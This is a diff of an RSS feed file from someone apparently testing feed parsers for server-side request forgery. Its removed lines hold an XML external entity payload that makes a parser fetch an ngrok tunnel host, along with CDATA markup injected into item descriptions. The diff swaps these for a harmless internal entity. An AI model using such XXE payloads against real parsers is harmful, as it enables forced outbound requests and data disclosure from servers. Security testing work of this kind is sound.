@@ -1,6 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "http://0d723cb4.ngrok.io" >]>
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The Blog Shibli</title>
@@ -10,7 +9,7 @@
      <item>
         <title>New item dropped</title>
         <link>http://example.com</link>
-        <description type="html">This <![CDATA[this is <b>bold</b>]]> is a new post by mohd shibli &lt;b&gt;</description>
+        <description>This is a new post by mohd shibli</description>
         <author>author@example.com</author>
         <pubDate>Mon, 28 March 2020 00:00:00 -0000</pubDate>
     </item>
@@ -24,13 +23,13 @@
     <item>
         <title>Shibli is testing for ssrf one more time</title>
         <link>http://example.com</link>
-        <description type="html">This <![CDATA[this is <b>bold</b>]]> is a new post by mohd shibli &lt;b&gt;</description>
+        <description>This is a new post by mohd shibli</description>
         <author>author@example.com</author>
         <pubDate>Mon, 28 March 2020 00:00:00 -0000</pubDate>
     </item>
     <item>
         <title>Shibli is testing for ssrf</title>
-        <link>&xxe;</link>
+        <link>&example;</link>
         <description>This is a new post by mohd shibli</description>
         <author>author@example.com</author>
         <pubDate>Mon, 28 March 2020 00:00:00 -0000</pubDate>
@@ -43,14 +42,14 @@
         <pubDate>Mon, 28 March 2020 00:00:00 -0000</pubDate>
     </item>
     <item>
-        <title>&xxe;</title>
+        <title>&example;</title>
         <link>http://0d723cb4.ngrok.io</link>
         <description>a super post</description>
         <author>author@example.com</author>
         <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
     </item>
     <item>
-        <title>&xxe;</title>
+        <title>&example;</title>
         <link>http://0d723cb4.ngrok.io</link>
         <description>This is a new post by mohd shibli</description>
         <author>author@example.com</author>
